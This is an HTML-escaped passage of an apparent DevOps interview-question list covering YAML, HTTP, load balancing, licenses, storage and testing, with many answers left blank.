&lt;p&gt;&lt;b&gt;It&#39;s good for use cases like writing a shell script where each line of the script is a different command. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between &lt;code&gt;someMultiLineString: |&lt;/code&gt; to &lt;code&gt;someMultiLineString: &amp;gt;&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;using &lt;code&gt;&amp;gt;&lt;/code&gt; will make the multi-line string to fold into a single line&lt;/p&gt; &lt;pre&gt;&lt;code&gt;someMultiLineString: &amp;gt;&#xA;  This is actually&#xA;  a single line&#xA;  do not let appearances fool you&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are placeholders in YAML?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;They allow you reference values instead of directly writing them and it is used like this:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;username: {{ my.user_name }}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you define multiple YAML components in one file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Using this: &lt;code&gt;---&lt;/code&gt; For Examples:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;document_number: 1&#xA;---&#xA;document_number: 2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Firmware&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is a firmware&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Firmware&#34;&gt;Wikipedia&lt;/a&gt;: &#34;In computing, firmware is a specific class of computer software that provides the low-level control for a device&#39;s specific hardware. Firmware, such as the BIOS of a personal computer, may contain basic functions of a device, and may provide hardware abstraction services to higher-level software such as operating systems.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Customers and Service Providers&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SLO (service-level objective)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SLA (service-level agreement)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Jira&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain/Demonstrate the following types in Jira: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Epic&lt;/li&gt; &#xA;   &lt;li&gt;Story&lt;/li&gt; &#xA;   &lt;li&gt;Task&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a project in Jira?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Kafka&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Kafka?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In Kafka, how to automatically balance brokers leadership of partitions in a cluster? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Enable auto leader election and reduce the imbalance percentage ratio&lt;/li&gt; &#xA;   &lt;li&gt;Manually rebalance by using kafkat&lt;/li&gt; &#xA;   &lt;li&gt;Configure group.initial.rebalance.delay.ms to 3000&lt;/li&gt; &#xA;   &lt;li&gt;All of the above&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Cassandra&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When running a cassandra cluster, how often do you need to run nodetool repair in order to keep the cluster consistent? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Within the columnFamily GC-grace Once a week&lt;/li&gt; &#xA;   &lt;li&gt;Less than the compacted partition minimum bytes&lt;/li&gt; &#xA;   &lt;li&gt;Depended on the compaction strategy&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;HTTP&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is HTTP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe HTTP request lifecycle&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Resolve host by request to DNS resolver&lt;/li&gt; &lt;li&gt;Client SYN&lt;/li&gt; &lt;li&gt;Server SYN+ACK&lt;/li&gt; &lt;li&gt;Client SYN&lt;/li&gt; &lt;li&gt;HTTP request&lt;/li&gt; &lt;li&gt;HTTP response &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? HTTP is stateful&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. It doesn&#39;t maintain state for incoming request. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How HTTP request looks like?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It consists of:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Request line - request type&lt;/li&gt; &lt;li&gt;Headers - content info like length, enconding, etc.&lt;/li&gt; &lt;li&gt;Body (not always included) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What HTTP method types are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;GET&lt;/li&gt; &lt;li&gt;POST&lt;/li&gt; &lt;li&gt;HEAD&lt;/li&gt; &lt;li&gt;PUT&lt;/li&gt; &lt;li&gt;DELETE&lt;/li&gt; &lt;li&gt;CONNECT&lt;/li&gt; &lt;li&gt;OPTIONS&lt;/li&gt; &lt;li&gt;TRACE &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What HTTP response codes are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;1xx - informational&lt;/li&gt; &lt;li&gt;2xx - Success&lt;/li&gt; &lt;li&gt;3xx - Redirect&lt;/li&gt; &lt;li&gt;4xx - Error, client fault&lt;/li&gt; &lt;li&gt;5xx - Error, server fault &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is HTTPS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain HTTP Cookies&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;HTTP is stateless. To share state, we can use Cookies.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;TODO: explain what is actually a Cookie &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is HTTP Pipelining?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You get &#34;504 Gateway Timeout&#34; error from an HTTP server. What does it mean?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The server didn&#39;t receive a response from another server it communicates with in a timely manner. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a proxy?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a reverse proxy?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is CDN?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When you publish a project, you usually publish it with a license. What types of licenses are you familiar with and which one do you prefer to use?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is &#34;X-Forwarded-For&#34;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/X-Forwarded-For&#34;&gt;Wikipedia&lt;/a&gt;: &#34;The X-Forwarded-For (XFF) HTTP header field is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Load Balancers&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a load balancer?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A load balancer accepts (or denies) incoming network traffic from a client, and based on some criteria (application related, network, etc.) it distributes those communications out to servers (at least one). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why to used a load balancer?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Scalability - using a load balancer, you can possibly add more servers in the backend to handle more requests/traffic from the clients, as opposed to using one server.&lt;/li&gt; &lt;li&gt;Redundancy - if one server in the backend dies, the load balancer will keep forwarding the traffic/requests to the second server so users won&#39;t even notice one of the servers in the backend is down. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What load balancer techniques/algorithms are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Round Robin&lt;/li&gt; &lt;li&gt;Weighted Round Robin&lt;/li&gt; &lt;li&gt;Least Connection&lt;/li&gt; &lt;li&gt;Weighted Least Connection&lt;/li&gt; &lt;li&gt;Resource Based&lt;/li&gt; &lt;li&gt;Fixed Weighting&lt;/li&gt; &lt;li&gt;Weighted Response Time&lt;/li&gt; &lt;li&gt;Source IP Hash&lt;/li&gt; &lt;li&gt;URL Hash &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the drawbacks of round robin algorithm in load balancing?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;A simple round robin algorithm knows nothing about the load and the spec of each server it forwards the requests to. It is possible, that multiple heavy workloads requests will get to the same server while other servers will got only lightweight requests which will result in one server doing most of the work, maybe even crashing at some point because it unable to handle all the heavy workloads requests by its own.&lt;/li&gt; &lt;li&gt;Each request from the client creates a whole new session. This might be a problem for certain scenarios where you would like to perform multiple operations where the server has to know about the result of operation so basically, being sort of aware of the history it has with the client. In round robin, first request might hit server X, while second request might hit server Y and ask to continue processing the data that was processed on server X already. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an Application Load Balancer?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In which scenarios would you use ALB?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;At what layers a load balancer can operate?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;L4 and L7 &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you perform load balancing without using a dedicated load balancer instance?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Yes, you can use DNS for performing load balancing. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is DNS load balancing? What its advantages? When would you use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Load Balancers - Sticky Sessions&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are sticky sessions? What are their pros and cons?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Recommended read:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://access.redhat.com/solutions/900933&#34;&gt;Red Hat Article&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;p&gt;Cons:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Can cause uneven load on instance (since requests routed to the same instances) Pros:&lt;/li&gt; &lt;li&gt;Ensures in-proc sessions are not lost when a new request is created &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Name one use case for using sticky sessions&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You would like to make sure the user doesn&#39;t lose the current session data. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What sticky sessions use for enabling the &#34;stickiness&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Cookies. There are application based cookies and duration based cookies. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain application-based cookies&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Generated by the application and/or the load balancer&lt;/li&gt; &lt;li&gt;Usually allows to include custom data &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain duration-based cookies&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Generated by the load balancer&lt;/li&gt; &lt;li&gt;Session is not sticky anymore once the duration elapsed &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;Load Balancers - Load Balancing Algorithms&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain each of the following load balancing techniques &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Round Robin&lt;/li&gt; &#xA;   &lt;li&gt;Weighted Round Robin&lt;/li&gt; &#xA;   &lt;li&gt;Least Connection&lt;/li&gt; &#xA;   &lt;li&gt;Weighted Least Connection&lt;/li&gt; &#xA;   &lt;li&gt;Resource Based&lt;/li&gt; &#xA;   &lt;li&gt;Fixed Weighting&lt;/li&gt; &#xA;   &lt;li&gt;Weighted Response Time&lt;/li&gt; &#xA;   &lt;li&gt;Source IP Hash&lt;/li&gt; &#xA;   &lt;li&gt;URL Hash&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain use case for connection draining?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; To ensure that a Classic Load Balancer stops sending requests to instances that are de-registering or unhealthy, while keeping the existing connections open, use connection draining. This enables the load balancer to complete in-flight requests made to instances that are de-registering or unhealthy. &lt;p&gt;The maximum timeout value can be set between 1 and 3,600 seconds on both GCP and AWS.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Licenses&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Are you familiar with &#34;Creative Commons&#34;? What do you know about it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the differences between copyleft and permissive licenses&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In Copyleft, any derivative work must use the same licensing while in permissive licensing there are no such condition. GPL-3 is an example of copyleft license while BSD is an example of permissive license. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Random&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How a search engine works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How auto completion works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is faster than RAM?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;CPU cache. &lt;a href=&#34;https://www.enterprisestorageforum.com/hardware/cache-memory/&#34;&gt;Source&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a memory leak?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is your favorite protocol?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;SSH HTTP DHCP DNS ... &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Cache API?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the C10K problem? Is it relevant today?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://idiallo.com/blog/c10k-2016&#34;&gt;https://idiallo.com/blog/c10k-2016&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Storage&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of storage formats are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;File&lt;/li&gt; &lt;li&gt;Block&lt;/li&gt; &lt;li&gt;Object &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of storage devices are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain IOPS&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain storage throughput&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a filesystem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Dark Data&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Questions you CAN ask&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a name=&#34;questions-you-ask&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A list of questions you as a candidate can ask the interviewer during or after the interview. These are only a suggestion, use them carefully. Not every interviewer will be able to answer these (or happy to) which should be perhaps a red flag warning for your regarding working in such place but that&#39;s really up to you.&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do you like about working here?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does the company promote personal growth?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the current level of technical debt you are dealing with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Be careful when asking this question - all companies, regardless of size, have some level of tech debt. Phrase the question in the light that all companies have the deal with this, but you want to see the current pain points they are dealing with &lt;br&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is a great way to figure how managers deal with unplanned work, and how good they are at setting expectations with projects. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why I should NOT join you? (or &#39;what you don&#39;t like about working here?&#39;)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What was your favorite project you&#39;ve worked on?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This can give you insights in some of the cool projects a company is working on, and if you would enjoy working on projects like these. This is also a good way to see if the managers are allowing employees to learn and grow with projects outside of the normal work you&#39;d do. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;If you could change one thing about your day to day, what would it be?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Similar to the tech debt question, this helps you identify any pain points with the company. Additionally, it can be a great way to show how you&#39;d be an asset to the team.&lt;br&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;For Example, if they mention they have problem X, and you&#39;ve solved that in the past, you can show how you&#39;d be able to mitigate that problem. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Let&#39;s say that we agree and you hire me to this position, after X months, what do you expect that I have achieved?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Not only this will tell you what is expected from you, it will also provide big hint on the type of work you are going to do in the first months of your job. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Testing&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain white-box testing&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain black-box testing&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are unit tests?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of tests would you run to test a web application?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain test harness?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is A/B testing?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is network simulation and how do you perform it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of performances tests are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following types of tests: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Load Testing&lt;/li&gt; &#xA;   &lt;li&gt;Stress Testing&lt;/li&gt; &#xA;   &lt;li&gt;Capacity Testing&lt;/li&gt; &#xA;   &lt;li&gt;Volume Testing&lt;/li&gt; &#xA;   &lt;li&gt;Endurance Testing&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Databases&lt;/h2&gt; &#xA;&lt;table&gt; 